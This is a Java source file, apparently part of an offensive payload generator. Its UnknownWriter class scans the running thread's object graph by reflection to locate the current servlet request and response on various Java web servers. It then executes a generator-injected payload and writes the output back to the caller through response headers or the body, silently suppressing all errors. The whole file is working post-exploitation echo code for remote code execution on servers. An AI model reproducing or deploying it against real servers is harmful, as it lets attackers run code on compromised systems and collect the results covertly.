package com.reajason.javaweb.probe.payload.response;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.IdentityHashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

/**
 * 未知中间件的通用回显 writer：不依赖具体容器的内部结构，
 * 从当前线程对象出发对字段引用图做 BFS，定位本次请求的
 * HttpServletRequest/HttpServletResponse 对象（javax 与 jakarta 双命名空间）。
 * 参考 fnmsd 的 FindClass_dfs 与 jmg 的 DFSEchoDetector，遍历改用 BFS：
 * DFS 的缠绕路径会把当前请求压到很深的层级（Tomcat8 实测超过 40 层）容易被深度上限截断，
 * BFS 按到当前线程的最短距离扩散，就近命中的一般就是本次请求。
 * 只接受能解析出触发参数的请求，避免把结果写进并发请求对应的响应。
 *
 * @author ReaJason
 */
public class UnknownWriter {

    private static boolean ok = false;

    /**
     * 固定数据（内置字节码等不依赖请求参数的内容）预执行标记与结果：
     * 先执行再找回显位置，回显定位失败也不影响字节码已经执行
     */
    private boolean preRan = false;
    private String preResult = null;

    /**
     * 遍历对象数上限，防止极端对象图拖垮请求线程。
     * Payara/GlassFish 的当前请求要经 线程组→他线程 blocker→selector→连接属性 才能定位，
     * 实测需要 60~95 万个对象，上限须留出余量
     */
    private static final int MAX_VISITED = 2000000;

    /**
     * 扫描的软时间预算：超时放弃遍历直接退出，避免拖住请求线程
     */
    private static final long MAX_SCAN_MILLIS = 8000L;

    /**
     * 去重必须用同一性而非 equals/hashCode：Grizzly 的 CharChunk、HK2 动态代理的
     * hashCode 会 NPE 或单次耗时上百毫秒，HashSet 会被这些实现拖垮
     */
    private final Set<Object> visited = Collections.newSetFromMap(new IdentityHashMap<Object, Boolean>());

    /**
     * 每个 Class 的可访问非原始字段只解析一次，避免对几十万个实例重复 getDeclaredFields/setAccessible
     */
    private final Map<Class<?>, List<Field>> fieldCache = new HashMap<Class<?>, List<Field>>();

    private Object request;
    private Object response;
    private Class<?> requestClass;
    private Class<?> responseClass;

    public UnknownWriter() {
        if (ok) {
            return;
        }
        try {
            runEarly();
            initServletClasses();
            scan(Thread.currentThread());
            if (request != null && response != null) {
                String data = getDataFromReq(request);
                if (data != null && !data.isEmpty()) {
                    String result = preRan ? preResult : execute(data);
                    if (result != null) {
                        if (!writeHeader(response, result)) {
                            try {
                                OutputStream outputStream = (OutputStream) invokeMethod(response, "getOutputStream", null, null);
                                outputStream.write(result.getBytes());
                                outputStream.flush();
                                outputStream.close();
                            } catch (Throwable e) {
                                PrintWriter writer = (PrintWriter) invokeMethod(response, "getWriter", null, null);
                                writer.write(result);
                                writer.flush();
                                writer.close();
                            }
                        }
                    }
                }
            }
        } catch (Throwable ignored) {
        } finally {
            ok = true;
        }
    }

    /**
     * javax 与 jakarta 双命名空间都试，类加载器优先用请求线程的上下文类加载器，
     * 保证 isInstance 判断和目标请求对象是同一个命名空间里的同一个类
     */
    private void initServletClasses() {
        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
        ClassLoader ownClassLoader = UnknownWriter.class.getClassLoader();
        String[] requestNames = {"jakarta.servlet.http.HttpServletRequest", "javax.servlet.http.HttpServletRequest"};
        String[] responseNames = {"jakarta.servlet.http.HttpServletResponse", "javax.servlet.http.HttpServletResponse"};
        for (int i = 0; i < requestNames.length; i++) {
            try {
                if (requestClass == null && contextClassLoader != null) {
                    requestClass = Class.forName(requestNames[i], false, contextClassLoader);
                }
            } catch (Throwable ignored) {
            }
            try {
                if (requestClass == null && ownClassLoader != null) {
                    requestClass = Class.forName(requestNames[i], false, ownClassLoader);
                }
            } catch (Throwable ignored) {
            }
            try {
                if (responseClass == null && contextClassLoader != null) {
                    responseClass = Class.forName(responseNames[i], false, contextClassLoader);
                }
            } catch (Throwable ignored) {
            }
            try {
                if (responseClass == null && ownClassLoader != null) {
                    responseClass = Class.forName(responseNames[i], false, ownClassLoader);
                }
            } catch (Throwable ignored) {
            }
        }
    }

    private void scan(Thread start) {
        long deadline = System.currentTimeMillis() + MAX_SCAN_MILLIS;
        LinkedList<Object> queue = new LinkedList<Object>();
        queue.add(start);
        while (!queue.isEmpty()) {
            Object o = queue.poll();
            if (o == null || !visited.add(o)) {
                continue;
            }
            if (request == null && requestClass != null && requestClass.isInstance(o)) {
                // 只认携带触发参数的那个请求，并发场景下不会串到别人的响应上，
                // 也不会误收容器回收池里残留的旧请求对象
                String data = null;
                try {
                    data = getDataFromReq(o);
                } catch (Throwable ignored) {
                }
                if (data != null && !data.isEmpty()) {
                    // 优先用 request.getResponse() 配对响应，找不到再依赖遍历里偶遇的 response
                    Object paired = null;
                    try {
                        paired = invokeMethod(o, "getResponse", null, null);
                    } catch (Throwable ignored) {
                    }
                    Object candidateResponse = paired != null ? paired : response;
                    // 已提交的响应属于已完成请求，当前正在处理的请求必然未提交
                    if (candidateResponse != null && !isCommitted(candidateResponse)) {
                        request = o;
                        response = candidateResponse;
                        return;
                    }
                    if (candidateResponse == null) {
                        // Jetty12 ee10/ee11 的 ServletApiRequest 没有 getResponse()，且 BFS 中
                        // 请求通常先于响应出现：先认领请求，等遍历遇到未提交响应时再配对
                        request = o;
                    }
                }
            }
            if (response == null && responseClass != null && responseClass.isInstance(o) && !isCommitted(o)) {
                response = o;
                if (request != null) {
                    return;
                }
            }
            for (Field field : fieldsOf(o.getClass())) {
                Object value;
                try {
                    value = field.get(o);
                } catch (Throwable ignored) {
                    continue;
                }
                if (value == null || value instanceof Class) {
                    continue;
                }
                if (value instanceof Object[]) {
                    Object[] items = (Object[]) value;
                    for (Object item : items) {
                        if (item != null) {
                            queue.add(item);
                        }
                    }
                } else if (!value.getClass().isArray()) {
                    queue.add(value);
                }
            }
            // 数量与时间检查都按批进行，避免每次迭代两次系统调用
            if ((visited.size() & 0xFFF) == 0) {
                if (visited.size() > MAX_VISITED || System.currentTimeMillis() > deadline) {
                    return;
                }
            }
        }
    }

    /**
     * 解析一个类的全部可访问非原始字段（含父类），结果按 Class 缓存。
     * 不做 isStatic 过滤，保持与逐对象遍历时代一致的可达性
     */
    private List<Field> fieldsOf(Class<?> type) {
        List<Field> fields = fieldCache.get(type);
        if (fields != null) {
            return fields;
        }
        fields = new ArrayList<Field>();
        Class<?> clazz = type;
        while (clazz != null) {
            Field[] declared;
            try {
                declared = clazz.getDeclaredFields();
            } catch (Throwable ignored) {
                break;
            }
            for (Field field : declared) {
                if (field.getType().isPrimitive()) {
                    continue;
                }
                try {
                    field.setAccessible(true);
                } catch (Throwable ignored) {
                    continue;
                }
                fields.add(field);
            }
            clazz = clazz.getSuperclass();
        }
        fieldCache.put(type, fields);
        return fields;
    }

    /**
     * ServletResponse.isCommitted()：判断不了时当作未提交，保持原有接受逻辑
     */
    private static boolean isCommitted(Object response) {
        try {
            return Boolean.TRUE.equals(invokeMethod(response, "isCommitted", null, null));
        } catch (Throwable ignored) {
            return false;
        }
    }

    private String getDataFromReq(Object request) throws Exception {
        return null;
    }

    private String run(String data) throws Exception {
        return null;
    }

    /**
     * 固定数据模式（内置字节码等）下 getDataFromReq 已被生成器替换为固定值，不依赖请求对象：
     * 先执行再找回显位置，防止回显定位失败导致字节码根本没执行；
     * 参数触发模式这里拿到 null 或抛异常，落回原有的「先定位再执行」流程
     */
    private void runEarly() {
        String data;
        try {
            data = getDataFromReq(null);
        } catch (Throwable ignored) {
            return;
        }
        if (data == null || data.isEmpty()) {
            return;
        }
        preRan = true;
        preResult = execute(data);
    }

    private String execute(String data) {
        try {
            return run(data);
        } catch (Throwable e) {
            return getErrorMessage(e);
        }
    }

    /**
     * ResponseHeader 通道：由生成器注入，返回 true 表示结果已写进响应头，跳过响应体。
     */
    private boolean writeHeader(Object response, String result) {
        return false;
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(obj.getClass() + " Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
